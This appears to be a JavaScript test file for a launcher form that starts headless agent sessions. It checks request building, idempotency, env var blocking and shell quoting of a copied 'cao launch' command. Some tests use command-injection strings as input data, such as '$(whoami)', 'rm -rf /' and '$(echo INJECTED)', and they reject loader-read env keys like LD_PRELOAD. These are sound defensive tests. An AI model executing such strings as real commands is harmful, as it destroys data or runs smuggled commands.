  for (const resolved of ["kiro_cli", "claude_code", "codex", "opencode_cli", "", undefined]) {
    const r = launch.buildRequest({ ...stale, provider: resolved ?? "" }, ctxOf({ resolved }));
    assert.deepEqual(Object.keys(r.query).filter((k) => /engine|resume/.test(k)), [], String(resolved));
    assert.doesNotMatch(JSON.stringify(r), /engine|resume|kas|"r1"/, String(resolved));
  }
});

test("provider is sent only when the user chose one; memory_manager only when chosen; session_name only when set", () => {
  const q = launch.buildRequest(form({ idempotencyKey: "k" }), ctxOf()).query;
  for (const key of ["provider", "memory_manager", "session_name", "engine", "resume_session_id", "allowed_tools"]) assert.ok(!(key in q), key);
});

test("YOLO becomes allowed_tools=*, and wins over an override and over resolved tools; auto-approve changes nothing", () => {
  const yolo = launch.buildRequest(form({ policy: "yolo", sessionName: "s", allowedTools: ["fs_read"], idempotencyKey: "k" }), ctxOf({ resolvedTools: ["fs_write"] }));
  assert.equal(yolo.query.allowed_tools, "*");
  const auto = launch.buildRequest(form({ policy: "auto", idempotencyKey: "k" }), ctxOf());
  assert.ok(!("allowed_tools" in auto.query));
  assert.deepEqual(auto.query, launch.buildRequest(form({ policy: "ask", idempotencyKey: "k" }), ctxOf()).query);
});

test("the message is only in the body, byte for byte, whatever it holds (shell characters, quotes, newlines, unicode)", () => {
  const nasty = "it's $(whoami) `id` ; rm -rf / \"q\" \\ \n\t é 日本語 🙂 %{http_code} &x=1#frag";
  const r = launch.buildRequest(form({ message: nasty, idempotencyKey: "k" }), ctxOf());
  assert.equal(r.body.initial_message, nasty);
  assert.ok(!JSON.stringify(r.query).includes("whoami"));
  const built = curlRequest({ machine: "cao", port: 9889, stdin: false }, r);
  assert.equal(built.ok, true);
  const url = built.exec.args.at(-1);
  assert.ok(!url.includes("whoami") && !decodeURIComponent(url).includes("whoami"), "the message is not in the URL");
  assert.ok(built.exec.args.includes(JSON.stringify({ initial_message: nasty })));
});

test("no message means no body; an empty message is not sent (the server refuses an empty initial_message)", () => {
  assert.equal(launch.buildRequest(form({ idempotencyKey: "k" }), ctxOf()).body, undefined);
  assert.equal(launch.buildRequest(form({ message: "", idempotencyKey: "k" }), ctxOf()).body, undefined);
});

test("--async is not a request field: it only changes the command and the result card", () => {
  const a = launch.buildRequest(form({ async: true, idempotencyKey: "k" }), ctxOf());
  assert.deepEqual(a, launch.buildRequest(form({ async: false, idempotencyKey: "k" }), ctxOf()));
  assert.ok(!JSON.stringify(a).includes("async"));
});

test("the working directory is always sent, exactly as typed (no fallback to the window's or the server's directory)", () => {
  const q = launch.buildRequest(form({ workdir: "/work/my repo/é", idempotencyKey: "k" }), ctxOf()).query;
  assert.equal(q.working_directory, "/work/my repo/é");
});

test("a request without an idempotency key is refused: a retry after a lost response would create a second session", () => {
  for (const key of [null, undefined, ""]) assert.throws(() => launch.buildRequest(form({ idempotencyKey: key }), ctxOf()), /idempotency/i, String(key));
});

test("env_vars are never in the request while stdin is off, even when rows are filled", () => {
  const f = form({ env: [{ key: "API_URL", value: "https://example.test" }], idempotencyKey: "k" });
  const r = launch.buildRequest(f, ctxOf({ stdin: false }));
  assert.ok(!JSON.stringify(r).includes("example.test"));
  assert.ok(!JSON.stringify(r).includes("env_vars"));
  assert.equal(r.body, undefined);
});

test("with stdin on, env values go in the body only and never in the query", () => {
  const f = form({ message: "hi", env: [{ key: "API_URL", value: "https://example.test" }, { key: "", value: "" }], idempotencyKey: "k" });
  const r = launch.buildRequest(f, ctxOf({ stdin: true }));
  assert.deepEqual(r.body, { initial_message: "hi", env_vars: { API_URL: "https://example.test" } });
  assert.ok(!JSON.stringify(r.query).includes("example.test"));
});

test("a request with env_vars cannot be turned into a curl argument list while stdin is off (13.2)", () => {
  const f = form({ env: [{ key: "A", value: "secret-value" }], idempotencyKey: "k" });
  const forced = launch.buildRequest(f, ctxOf({ stdin: true }));
  const built = curlRequest({ machine: "cao", port: 9889, stdin: false }, forced);
  assert.equal(built.ok, false);
  assert.equal(built.outcome.kind, "env_refused");
  assert.ok(!JSON.stringify(built).includes("secret-value"));
});

test("a message over the argument limit is refused before exec, naming the CLI command", () => {
  const r = launch.buildRequest(form({ message: "x".repeat(ARG_BODY_MAX), idempotencyKey: "k" }), ctxOf());
  const built = curlRequest({ machine: "cao", port: 9889, stdin: false }, r);
  assert.equal(built.ok, false);
  assert.equal(built.outcome.kind, "too_large");
  assert.match(built.outcome.message, /cao launch/);
});

test("Retry after a lost response: the same submission builds the identical request with the same key", () => {
  let n = 0;
  const first = launch.withKey(form({ message: "hi" }), () => `key-${++n}`);
  assert.equal(first.idempotencyKey, "key-1");
  const again = launch.withKey(first, () => `key-${++n}`);
  assert.equal(again.idempotencyKey, "key-1");
  assert.equal(n, 1, "the generator is not called again");
  assert.deepEqual(launch.buildRequest(first, ctxOf()), launch.buildRequest(again, ctxOf()));
});

test("a new submission gets a new key, and withKey does not change the form it is given", () => {
  let n = 0;
  const base = Object.freeze(form());
  const one = launch.withKey(base, () => `key-${++n}`);
  const two = launch.withKey(base, () => `key-${++n}`);
  assert.deepEqual([one.idempotencyKey, two.idempotencyKey], ["key-1", "key-2"]);
  assert.equal(base.idempotencyKey, null);
});

// ======================================================================================================
// Equivalent command
// ======================================================================================================

test("Masked env in the command: the value is replaced by an ellipsis, and Copy can reveal it", () => {
  const f = form({ env: [{ key: "API_URL", value: "https://example.test" }], message: "go" });
  const masked = launch.equivalentCommand(f, ctxOf());
  const argv = shellArgv(masked, "cao");
  assert.equal(argv[argv.indexOf("--env") + 1], "API_URL=…");
  assert.ok(!masked.includes("example.test"));
  const revealed = shellArgv(launch.equivalentCommand(f, ctxOf({ reveal: true })), "cao");
  assert.equal(revealed[revealed.indexOf("--env") + 1], "API_URL=https://example.test");
});

test("the command is a cao launch --headless line with every filled option", () => {
  const f = form({ sessionName: "s1", provider: "codex", allowedTools: ["fs_read", "fs_list"], memory: true, async: true, message: "Run the tests" });
  const argv = shellArgv(launch.equivalentCommand(f, ctxOf({ resolved: "codex" })), "cao");
  assert.deepEqual(argv.slice(0, 2), ["launch", "--headless"]);
  const after = (flag) => argv.filter((a, i) => argv[i - 1] === flag);
  assert.deepEqual(after("--agents"), ["developer"]);
  assert.deepEqual(after("--session-name"), ["s1"]);
  assert.deepEqual(after("--provider"), ["codex"]);
  assert.deepEqual(after("--working-directory"), ["/work/repo"]);
  assert.deepEqual(after("--allowed-tools"), ["fs_read", "fs_list"], "repeatable, one value per flag");
  assert.ok(argv.includes("--memory") && argv.includes("--async"));
  assert.equal(argv.at(-1), "Run the tests", "the message is the positional argument");
});

test("the policy shows as its flag: YOLO is --yolo, auto-approve is --auto-approve, ask-first has neither", () => {
  const has = (policy) => shellArgv(launch.equivalentCommand(form({ policy, sessionName: "s" }), ctxOf()), "cao");
  assert.ok(has("yolo").includes("--yolo") && !has("yolo").includes("--auto-approve"));
  assert.ok(has("auto").includes("--auto-approve") && !has("auto").includes("--yolo"));
  assert.ok(!has("ask").includes("--yolo") && !has("ask").includes("--auto-approve"));
});

test("the equivalent command has no --engine and no --resume-session-id for any provider, even from a form that still holds the old fields", () => {
  const f = form({ engine: "kas", resumeId: "r1" });
  for (const resolved of ["kiro_cli", "claude_code", "codex", "opencode_cli", "", undefined]) {
    const line = launch.equivalentCommand(f, ctxOf({ resolved }));
    const argv = shellArgv(line, "cao");
    assert.ok(!argv.includes("--engine") && !argv.includes("--resume-session-id"), `${resolved}: ${line}`);
    assert.doesNotMatch(line, /engine|resume|kas|\br1\b/, String(resolved));
  }
});

test("a shell reading the command gets exactly the typed values back, whatever characters they hold", () => {
  const msg = "it's $(echo INJECTED) `echo INJECTED` ; echo INJECTED && \"q\" \\ \n second line é 🙂 *";
  const f = form({
    profile: "dev eloper", sessionName: "s1", workdir: "/work/my repo/$(echo INJECTED)", message: msg,
    allowedTools: ["fs_read"], env: [{ key: "TOKEN", value: "p'a ss;$(echo INJECTED)" }],
  });
  const argv = shellArgv(launch.equivalentCommand(f, ctxOf({ reveal: true })), "cao");
  assert.equal(argv[argv.indexOf("--agents") + 1], "dev eloper");
  assert.equal(argv[argv.indexOf("--working-directory") + 1], "/work/my repo/$(echo INJECTED)");
  assert.equal(argv[argv.indexOf("--env") + 1], "TOKEN=p'a ss;$(echo INJECTED)");
  assert.equal(argv.at(-1), msg);
  assert.ok(!argv.some((a) => a === "INJECTED"), "no word of the injected command was run");
});

test("an option-looking message cannot become an option of the command", () => {
  const argv = shellArgv(launch.equivalentCommand(form({ message: "--yolo" }), ctxOf()), "cao");
  assert.ok(!argv.slice(0, -1).includes("--yolo"), "the message is the last argument");
});

// ======================================================================================================
// Discard guard
// ======================================================================================================

test("Escape with typed text asks; an untouched form does not; choosing a policy alone is not typed text", () => {
  const initial = launch.emptyForm("/work/repo");
  assert.equal(launch.discardNeeded(initial, initial), false);
  assert.equal(launch.discardNeeded({ ...initial }, initial), false);
  assert.equal(launch.discardNeeded({ ...initial, message: "hi" }, initial), true);
  assert.equal(launch.discardNeeded({ ...initial, policy: "auto" }, initial), false);
  assert.equal(launch.discardNeeded({ ...initial, policy: "yolo" }, initial), false);
});

test("every typed field counts for the discard guard, including an env row and a changed directory", () => {
  const initial = launch.emptyForm("/work/repo");
  for (const change of [{ profile: "p" }, { provider: "codex" }, { sessionName: "s" }, { workdir: "/other" }, { allowedTools: ["fs_read"] },
    { memory: true }, { async: true }, { env: [{ key: "A", value: "" }] }, { env: [{ key: "", value: "v" }] }]) {
    assert.equal(launch.discardNeeded({ ...initial, ...change }, initial), true, JSON.stringify(change));
  }
  assert.equal(launch.discardNeeded({ ...initial, env: [{ key: "", value: "" }] }, initial), false, "an empty env row is not typed text");
});

// ======================================================================================================
// What the server answered (task 9.3 steps 1-2)
// ======================================================================================================

test("Result card: a 201 selects the session and lists the recorded tools and whether a message was sent", () => {
  const body = { id: "t1", session_name: "cao-s1", allowed_tools: ["fs_read", "execute_bash"] };
  const o = launch.launchOutcome({ kind: "ok", status: 201, json: body }, form({ message: "hi" }));
  assert.deepEqual([o.type, o.session, o.terminalId, o.tools, o.messageSent], ["created", "cao-s1", "t1", ["fs_read", "execute_bash"], true]);
  const bare = launch.launchOutcome({ kind: "ok", status: 201, json: { id: "t1", session_name: "cao-s1" } }, form());
  assert.deepEqual([bare.tools, bare.messageSent], [null, false]);
});

test("Retry after a lost response: the replayed answer is the one terminal, shown like a first answer", () => {
  const json = { id: "t1", session_name: "cao-s1", allowed_tools: ["fs_read"] };
  const first = launch.launchOutcome({ kind: "ok", status: 201, json }, form({ idempotencyKey: "k1" }));
  const replay = launch.launchOutcome({ kind: "ok", status: 201, json: { ...json } }, form({ idempotencyKey: "k1" }));
  assert.deepEqual(replay, first);
});

test("a replay of a create that failed answers 424 with the cause: the cause is shown and the same key is not offered again", () => {
  const o = launch.launchOutcome({ kind: "error", status: 424, detail: "provider failed to start", json: { detail: "provider failed to start", terminal_id: "t9" } }, form({ idempotencyKey: "k1" }));
  assert.notEqual(o.type, "retry");
  assert.notEqual(o.type, "created");
  assert.ok(!("retryKey" in o), "retrying with the same key would answer 424 again");
  assert.match(JSON.stringify(o), /provider failed to start/);
});

test("a 400 about another field is not shown at the session name field", () => {
  const o = launch.launchOutcome({ kind: "error", status: 400, detail: "invalid resume_session_id: expected 8-64 chars of [A-Za-z0-9._-]" }, form());
  assert.equal(o.type, "field");
  assert.notEqual(o.field, "sessionName");
  assert.match(o.message, /resume_session_id/);
  assert.equal(launch.launchOutcome({ kind: "error", status: 400, detail: "Invalid session_name: 'a b'" }, form()).field, "sessionName");
});

test("Retry after a lost response: curl status 000 offers Retry with the same key and sends nothing by itself", () => {
  const o = launch.launchOutcome({ kind: "unreachable" }, form({ idempotencyKey: "k1" }));
  assert.deepEqual([o.type, o.retryKey], ["retry", "k1"]);
});

test("Server rejects the name: a 400 shows the server's message at the session name field", () => {
  assert.deepEqual(launch.launchOutcome({ kind: "error", status: 400, detail: "Invalid session_name: 'a b'" }, form()), {
    type: "field", field: "sessionName", message: "Invalid session_name: 'a b'",
  });
});

test("a 422 goes to the field it names: env_vars, agent_profile, working_directory", () => {
  const f = form();
  assert.equal(launch.launchOutcome({ kind: "error", status: 422, detail: "body.env_vars: bad" }, f).field, "env");
  assert.equal(launch.launchOutcome({ kind: "error", status: 422, detail: "query.agent_profile: missing" }, f).field, "profile");
  assert.equal(launch.launchOutcome({ kind: "error", status: 422, detail: "query.working_directory: bad" }, f).field, "workdir");
  assert.equal(launch.launchOutcome({ kind: "error", status: 422, detail: "something else" }, f).type, "field");
});

test("Node at its terminal cap: a 429 says the server is at its terminal limit and nothing is retried", () => {
  const o = launch.launchOutcome({ kind: "error", status: 429, detail: "limit" }, form({ idempotencyKey: "k" }));
  assert.match(o.message, /terminal limit/);
  assert.ok(!("retryKey" in o), "no automatic retry");
});

test("auth and other errors: auth is its own outcome, a 500 shows the server's detail", () => {
  assert.equal(launch.launchOutcome({ kind: "auth", status: 401 }, form()).type, "auth");
  assert.equal(launch.launchOutcome({ kind: "auth", status: 403 }, form()).type, "auth");
  const e = launch.launchOutcome({ kind: "error", status: 500, detail: "boom" }, form());
  assert.deepEqual([e.type, e.message], ["error", "boom"]);
});

test("too large to send: the refusal from the data path shows its message and is not a retry", () => {
  const o = launch.launchOutcome({ kind: "too_large", message: "too large to send from this window (130000 bytes)" }, form());
  assert.notEqual(o.type, "retry");
  assert.match(JSON.stringify(o), /too large to send/);
});

test("a malformed 201 (not JSON, or without a session name) is not shown as a created session", () => {
  for (const json of [undefined, null, {}, [], "x", { id: "t1" }]) {
    const o = launch.launchOutcome({ kind: "ok", status: 201, json }, form());
    assert.notEqual(o.type, "created", String(JSON.stringify(json)));
  }
});

// ======================================================================================================
// Review round: every shell-significant word survives the copied command; paths; env note; the CLI's notes
// ======================================================================================================

test("a single word with no space that a shell would read as something else round-trips unchanged as a message, a directory, a profile and an env value", () => {
  const cwd = globDir();
  for (const word of HARD_WORDS) {
    const f = form({ profile: word, workdir: word, message: word, env: [{ key: "TOKEN", value: word }] });
    const line = launch.equivalentCommand(f, ctxOf({ reveal: true }));
    if (needsQuotes(word) && !word.includes("'")) assert.equal(quotedCount(line, word), 4, `${word}: profile, directory, env value and message are each quoted in: ${line}`);
    const argv = shellArgv(line, "cao", { cwd });
    assert.equal(argv[argv.indexOf("--agents") + 1], word, `profile ${word}`);
    assert.equal(argv[argv.indexOf("--working-directory") + 1], word, `directory ${word}`);
    assert.equal(argv[argv.indexOf("--env") + 1], `TOKEN=${word}`, `env value ${word}`);
    const message = argv.at(-1);
    assert.equal(message, word, `message ${word}`);
  }
});

test("a single word that a shell reads as something else is also safe as a session name, a provider and an allowed tool in the command", () => {
  const cwd = globDir();
  for (const word of HARD_WORDS) {
    const f = form({ sessionName: word, provider: word, allowedTools: [word, "fs_read"] });
    const line = launch.equivalentCommand(f, ctxOf({ resolved: "kiro_cli" }));
    if (needsQuotes(word) && !word.includes("'")) {
      assert.equal(quotedCount(line, word), 3, `${word}: session name, provider and tool are each quoted in: ${line}`);
    }
    const argv = shellArgv(line, "cao", { cwd });
    assert.equal(argv[argv.indexOf("--session-name") + 1], word, `session name ${word}`);
    assert.equal(argv[argv.indexOf("--provider") + 1], word, `provider ${word}`);
    assert.equal(argv[argv.indexOf("--allowed-tools") + 1], word, `tool ${word}`);
  }
});

test("a word that starts with = is quoted in the copied command: zsh turns an unquoted =ls into the path of ls", () => {
  const f = form({ profile: "=ls", workdir: "=ls", message: "=ls" });
  const line = launch.equivalentCommand(f, ctxOf());
  assert.ok(line.includes(" '=ls'"), line);
  assert.ok(!/(^| )=ls( |$)/.test(line), `an unquoted =ls in: ${line}`);
  assert.equal(shellArgv(line, "cao").filter((a) => a === "=ls").length, 3);
  // The same word after a flag-less position, and with more text after the =, is still quoted.
  const g = launch.equivalentCommand(form({ message: "=ls -l" }), ctxOf());
  assert.ok(g.endsWith("'=ls -l'"), g);
});

test("the option-looking message follows -- as the last two words, so the CLI cannot read it as an option", () => {
  const argv = shellArgv(launch.equivalentCommand(form({ message: "--yolo" }), ctxOf()), "cao");
  assert.deepEqual(argv.slice(-2), ["--", "--yolo"]);
  assert.deepEqual(shellArgv(launch.equivalentCommand(form({ message: "-n" }), ctxOf()), "cao").slice(-2), ["--", "-n"]);
  assert.ok(!shellArgv(launch.equivalentCommand(form({ message: "hello" }), ctxOf()), "cao").includes("--") , "no -- when the message is not option-like");
});

test("the working directory must be an absolute path on the CAO machine: ., ~/x and x/y are not", () => {
  for (const bad of [".", "..", "./x", "../x", "~", "~/x", "x/y", "x", "work/repo", "C:", "-x"]) {
    const r = launch.workdirCheck(bad);
    assert.equal(r.ok, false, JSON.stringify(bad));
    assert.match(r.message, /absolute|a directory on the CAO machine/, JSON.stringify(bad));
  }
  for (const good of ["/", "/work/repo", "/work/my repo", "/work/é/日本", "/a/b/"]) assert.equal(launch.workdirCheck(good).ok, true, good);
});

test("a relative directory blocks Launch at the directory field", () => {
  for (const workdir of [".", "~/x", "x/y"]) {
    const r = launch.launchBlocked(form({ workdir }), ctxOf());
    assert.equal(r.blocked, true, workdir);
    assert.deepEqual(r.problems.map((p) => p.field), ["workdir"], workdir);
  }
});

test("a bad env row with stdin off still carries the env-values-not-sent note, next to the key's own error", () => {
  const f = form({ env: [{ key: "LD_PRELOAD", value: "x" }] });
  const r = launch.launchBlocked(f, ctxOf({ stdin: false }));
  assert.equal(r.blocked, true);
  assert.equal(r.useCli, true);
  const env = r.problems.filter((p) => p.field === "env");
  assert.ok(env.some((p) => p.row === 0 && /read by the loader, shell or an interpreter when the pane starts/.test(p.message)), JSON.stringify(env));
  assert.ok(env.some((p) => p.message === "env values are not sent from this window"), JSON.stringify(env));
});

test("with stdin on a bad env row only has its own error, and no note", () => {
  const r = launch.launchBlocked(form({ env: [{ key: "LD_PRELOAD", value: "x" }] }), ctxOf({ stdin: true }));
  assert.equal(r.useCli, false);
  assert.ok(!r.problems.some((p) => p.message === "env values are not sent from this window"));
  assert.equal(r.problems.length, 1);
});

// The CLI's YOLO note, read from launch.py: the string literals of the click.style(...) call that holds it.
function cliYoloNote(pyText, firstLine) {
  const at = pyText.indexOf(firstLine);
  assert.ok(at > 0, `launch.py no longer says: ${firstLine}`);
  const start = pyText.lastIndexOf("click.style(", at);
  const end = pyText.indexOf("fg=", at);
  const unescape = (t) => t.replace(/\\(n|"|'|\\)/g, (_, c) => (c === "n" ? "\n" : c));
  const literals = [...pyText.slice(start, end).matchAll(/"((?:[^"\\\n]|\\.)*)"/g)].map((m) => unescape(m[1]));
  return literals.join("").replace(/^\s*Note:\s*/, "").replace(/\s+/g, " ").trim();
}
const squash = (t) => String(t).replace(/^\s*Note:\s*/, "").replace(/\s+/g, " ").trim();

test("the YOLO note for kiro_cli and opencode_cli is the CLI's whole note, not its first sentence", () => {
  if (!existsSync(LAUNCH_PY)) return console.log("SKIP - launch.py not found; YOLO note parity not checked");
  const py = readFileSync(LAUNCH_PY, "utf8");
  const kiro = cliYoloNote(py, "--yolo does not widen kiro_cli's tool set");
  const opencode = cliYoloNote(py, "--yolo has no runtime effect on opencode_cli");
  assert.ok(kiro.length > 150 && opencode.length > 100, "the extractor read a whole note");
  assert.equal(squash(launch.yoloDialog(DEV, "kiro_cli").installTime.note), kiro);
  assert.equal(squash(launch.yoloDialog(DEV, "opencode_cli").installTime.note), opencode);
});

test("the extractor that reads the CLI's note takes every literal of the call and stops at its fg=", () => {
  const sample = 'click.style(\n    "  Note: --yolo x.\\n"\n    "  Second \\"line\\" of it.\\n",\n    fg="yellow",\n)\nclick.echo("other")';
  assert.equal(cliYoloNote(sample, "--yolo x"), 'Second "line" of it.'.replace(/^/, "--yolo x. "));
});

// ---- which field a 400 or 422 belongs to: the prefix the server puts on it, not a word inside its value ----

test("a 400 goes to the field the server names at the start of its message, whatever words the echoed value holds", () => {
  const at = (detail) => launch.launchOutcome({ kind: "error", status: 400, detail }, form()).field;
  for (const word of ["profile", "provider", "engine", "resume", "working_directory", "initial_message", "allowed_tools", "env_vars", "agent_profile", "my profile x"]) {
    assert.equal(at(`Invalid session_name: '${word}'`), "sessionName", `session name holding ${word}`);
  }
  // The window sends neither option now, so an answer that names one is a form-level message, never a field of the form.
  assert.equal(at("invalid resume_session_id: got 'x'"), "form");
  assert.equal(at("Agent profile 'session_name' not found"), "profile");
  assert.equal(at("Agent profile 'provider engine' not found"), "profile");
});

test("a 422 names its field by the query or body name after its prefix, not by a word in the message", () => {
  const at = (detail) => launch.launchOutcome({ kind: "error", status: 422, detail }, form()).field;
  assert.equal(at("query.agent_profile: Field required"), "profile");
  assert.equal(at("query.engine: Input should be 'v2' or 'v3' (got session_name)"), "form", "the window does not send an engine, so no field is its");
  assert.equal(at("query.working_directory: bad (profile provider)"), "workdir");
  assert.equal(at("body.env_vars: env key 'PATH' is read by the loader (resume)"), "env");
  assert.equal(at("body.initial_message: too long (engine)"), "message");
  assert.equal(at("query.provider: unknown provider 'engine'"), "provider");
});

test("a message with no recognisable prefix is a form-level message even when it holds a field's word", () => {
  const o = launch.launchOutcome({ kind: "error", status: 400, detail: "something about a profile or an engine went wrong" }, form());
  assert.deepEqual([o.type, o.field], ["field", "form"]);
});

// ======================================================================================================
// Honesty (cao-window-honesty-labels): the two surfaces this section owns
// ======================================================================================================

test("declaredTools and notEnforced are no longer pending once launch.js exists", () => {
  for (const surface of ["declaredTools", "notEnforced"]) assert.ok(!Object.hasOwn(HONESTY_PENDING, surface), `${surface} is still listed as pending`);
});

// ======================================================================================================
// The New session form in the panel (tasks 9.2 and 9.3): what lib/launch.js decides for it.
// No spec names these functions. The contract is the launcher spec's scenarios plus the comment on each
// function in lib/launch.js; where both are silent, the case says which default it pins.
// ======================================================================================================

const frozenDeep = (v) => {
  if (v && typeof v === "object" && !Object.isFrozen(v)) { Object.freeze(v); for (const k of Object.keys(v)) frozenDeep(v[k]); }
  return v;
};
const planOf = (over = {}, ctx = ctxOf()) => launch.launchPlan(form(over), ctx);
const ENV_ROW = [{ key: "API_URL", value: "https://example.test" }];
const developer = () => ({ name: "developer", role: "developer", allowedTools: ["fs_read", "execute_bash"], provider: null });
const askOf = (over = {}) => launch.launchDialog("ask", { profile: developer(), provider: "claude_code", ...over });
const yoloOf = (over = {}) => launch.launchDialog("yolo", { profile: developer(), provider: "claude_code", sessionName: "my-session", ...over });
const createdOf = (json = {}, over = {}) => launch.launchOutcome(
  { kind: "ok", json: { session_name: "cao-x", id: "t1", allowed_tools: ["fs_read", "execute_bash"], ...json } },
  form({ message: "Run the tests", ...over }),
);

// ---- launchPlan ------------------------------------------------------------------------------------

test("launchPlan: Ask first opens the Ask-first dialog, YOLO the typed-name dialog, Auto-approve sends at once", () => {
  const ask = planOf({ policy: "ask" });
  assert.deepEqual([ask.action, ask.dialog], ["dialog", "ask"]);
  const yolo = planOf({ policy: "yolo", sessionName: "my-session" });
  assert.deepEqual([yolo.action, yolo.dialog], ["dialog", "yolo"]);
  const auto = planOf({ policy: "auto" });
  assert.equal(auto.action, "send");
  assert.equal(auto.dialog, undefined, "Auto-approve skips the dialog");
  assert.deepEqual([launch.launchPlan(form(), ctxOf()).action, launch.launchPlan(form(), ctxOf()).dialog], ["dialog", "ask"], "a new form is Ask first");
});

test("launchPlan: a missing profile, a bad name and no directory each block Launch at their field, and the first takes focus", () => {
  const f = form({ profile: "", sessionName: "my session", workdir: "" });
  const p = launch.launchPlan(f, ctxOf());
  assert.equal(p.action, "blocked");
  assert.deepEqual(p.problems.map((x) => x.field), ["profile", "sessionName", "workdir"]);
  assert.deepEqual(p.first, p.problems[0]);
  assert.equal(p.first.field, "profile");
  assert.deepEqual(p.problems, launch.launchBlocked(f, ctxOf()).problems, "the plan shows the problems launchBlocked finds, in its order");
  // each alone, with the spec's words
  const first = (over) => launch.launchPlan(form(over), ctxOf()).first;
  assert.deepEqual(first({ workdir: "" }), { field: "workdir", message: "a directory on the CAO machine is needed" });
  assert.deepEqual(first({ sessionName: "my session" }), { field: "sessionName", message: "only letters, digits, - and _ are allowed" });
  assert.deepEqual(first({ profile: "" }), { field: "profile", message: "choose an agent profile" });
});

test("launchPlan: a blocked form opens no dialog and sends nothing, whatever the policy", () => {
  for (const policy of ["ask", "auto", "yolo"]) {
    const p = launch.launchPlan(form({ policy, sessionName: "s1", workdir: "" }), ctxOf());
    assert.equal(p.action, "blocked", policy);
    assert.equal(p.first.field, "workdir", policy);
    assert.equal(p.dialog, undefined, policy);
  }
});

test("YOLO without a name: no dialog and no request; the session name field says a name is needed to confirm", () => {
  for (const sessionName of ["", "  "]) {
    const p = planOf({ policy: "yolo", sessionName });
    assert.equal(p.action, "blocked", JSON.stringify(sessionName));
    assert.equal(p.first.field, "sessionName", JSON.stringify(sessionName));
  }
  assert.match(planOf({ policy: "yolo", sessionName: "" }).first.message, /name is needed to confirm/);
  // another policy with no name is fine: the server picks one
  assert.equal(planOf({ policy: "auto", sessionName: "" }).action, "send");
  assert.equal(planOf({ policy: "ask", sessionName: "" }).action, "dialog");
  // a YOLO form with a bad profile still reports the profile first
  assert.equal(planOf({ policy: "yolo", sessionName: "", profile: "" }).first.field, "profile");
});

test("Env row filled: Launch is blocked with the note and the command takes over; Auto-approve does not get past it", () => {
  for (const policy of ["ask", "auto", "yolo"]) {
    const p = planOf({ policy, sessionName: "s1", env: ENV_ROW }, ctxOf({ stdin: false }));
    assert.equal(p.action, "blocked", policy);
    assert.equal(p.useCli, true, policy);
    assert.equal(p.first.field, "env", policy);
    assert.ok(p.problems.some((x) => x.message === "env values are not sent from this window"), policy);
  }
  assert.equal(launch.launchPlan(form({ policy: "auto", env: ENV_ROW })).action, "blocked", "no ctx means stdin is off");
  assert.equal(planOf({ policy: "auto", env: ENV_ROW }, ctxOf({ stdin: true })).action, "send", "with stdin on, valid env rows may go");
  assert.equal(planOf({ policy: "auto", env: [{ key: "", value: "" }] }).action, "send", "an untouched row is not a filled row");
  const bad = planOf({ policy: "auto", env: [{ key: "CLAUDE_CONFIG", value: "x" }] }, ctxOf({ stdin: true }));
  assert.deepEqual([bad.action, bad.first.field, bad.first.row], ["blocked", "env", 0], "a bad row blocks even with stdin on, at its row");
});

test("launchPlan: a policy it does not know is Ask first; it never turns into a send or a YOLO dialog", () => {
  for (const policy of [undefined, null, "", "YOLO", "yolo ", "auto-approve", 0]) {
    const p = planOf({ policy, sessionName: "s1" });
    assert.deepEqual([p.action, p.dialog], ["dialog", "ask"], JSON.stringify(policy));
  }
});

test("launchPlan changes nothing it is given, and gives the same answer twice", () => {
  const f = frozenDeep(form({ policy: "auto", sessionName: "s1", env: [{ key: "A", value: "1" }] }));
  const c = frozenDeep(ctxOf({ stdin: false }));
  const one = launch.launchPlan(f, c);
  assert.deepEqual(launch.launchPlan(f, c), one);
  assert.equal(one.action, "blocked");
});

// ---- parseToolList ---------------------------------------------------------------------------------

test("parseToolList: commas and spaces separate; empties and repeats go; the first place of a repeat stays", () => {
  assert.deepEqual(launch.parseToolList("execute_bash, fs_read"), ["execute_bash", "fs_read"]);
  assert.deepEqual(launch.parseToolList("a b,c ,, d"), ["a", "b", "c", "d"]);
  assert.deepEqual(launch.parseToolList("b a b c a"), ["b", "a", "c"]);
  assert.deepEqual(launch.parseToolList("  ,  ,"), []);
  assert.deepEqual(launch.parseToolList("a\tb\nc"), ["a", "b", "c"], "a pasted list may hold newlines and tabs");
  assert.deepEqual(launch.parseToolList("A a"), ["A", "a"], "tool names are case-sensitive");
});

test("parseToolList: nothing typed is no override; a name is kept whole, whatever it holds", () => {
  for (const nothing of ["", " ", null, undefined]) assert.deepEqual(launch.parseToolList(nothing), [], JSON.stringify(nothing));
  assert.deepEqual(launch.parseToolList("*"), ["*"]);
  assert.deepEqual(launch.parseToolList("@cao-mcp-server, @cao-mcp-server/send_message fs_read"), ["@cao-mcp-server", "@cao-mcp-server/send_message", "fs_read"]);
  assert.deepEqual(launch.parseToolList("outil_été, 工具, tool;rm -rf"), ["outil_été", "工具", "tool;rm", "-rf"]);
  const many = Array.from({ length: 5000 }, (_, i) => `tool_${i}`);
  assert.deepEqual(launch.parseToolList(`${many.join(", ")}, ${many.slice(0, 100).join(" ")}`), many);
  const twice = launch.parseToolList("x, y, x");
  assert.deepEqual(launch.parseToolList(twice.join(", ")), twice, "parsing what it printed gives the same list");
});

test("a parsed tool list is the repeatable --allowed-tools: comma-joined in the request, one flag each in the command", () => {
  const f = form({ allowedTools: launch.parseToolList("fs_read, execute_bash, fs_read"), idempotencyKey: "k1" });
  assert.equal(launch.buildRequest(f, ctxOf()).query.allowed_tools, "fs_read,execute_bash");
  assert.match(launch.equivalentCommand(f, ctxOf()), /--allowed-tools fs_read --allowed-tools execute_bash$/);
  const none = form({ allowedTools: launch.parseToolList("  "), idempotencyKey: "k1" });
  assert.equal(Object.hasOwn(launch.buildRequest(none, ctxOf()).query, "allowed_tools"), false, "an empty field is no override");
});

// ---- profileRoute ----------------------------------------------------------------------------------

test("profileRoute: the route of GET /agents/profiles/{name}, with the name escaped as one path segment", () => {
  assert.equal(launch.profileRoute("developer"), "/agents/profiles/developer");
  assert.equal(launch.profileRoute("my-profile_2"), "/agents/profiles/my-profile_2");
  assert.equal(launch.profileRoute("my.profile"), "/agents/profiles/my.profile", "a dot inside a name is fine");
  assert.equal(launch.profileRoute("a b"), "/agents/profiles/a%20b");
  assert.equal(launch.profileRoute("a/b"), "/agents/profiles/a%2Fb");
  assert.equal(launch.profileRoute("日本"), `/agents/profiles/${encodeURIComponent("日本")}`);
});

test("profileRoute: a name the window will not put in a path gives null: empty, '.', or one holding '..'", () => {
  for (const name of ["", ".", "..", "...", "a..b", "../x", "x/..", "..%2f", "a/../b"]) assert.equal(launch.profileRoute(name), null, JSON.stringify(name));
});

